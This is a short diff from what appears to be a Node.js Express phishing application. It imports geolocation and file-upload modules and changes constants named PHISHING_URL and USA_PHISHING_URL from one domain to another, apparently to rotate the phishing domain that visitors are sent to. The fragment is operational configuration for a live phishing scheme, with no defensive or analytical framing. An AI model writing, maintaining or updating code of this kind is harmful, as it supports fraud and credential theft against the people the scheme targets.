@@ -8,8 +8,8 @@ const expressLayout = require("express-ejs-layouts");
 const fileUpload = require("express-fileupload");
 const {IP2Location} = require("ip2location-nodejs");
 
-const PHISHING_URL = "votpicklify.pro";
-const USA_PHISHING_URL = "votpicklify.pro";
+const PHISHING_URL = "votrio.pro";
+const USA_PHISHING_URL = "votrio.pro";
 
 
 // CONFIGS
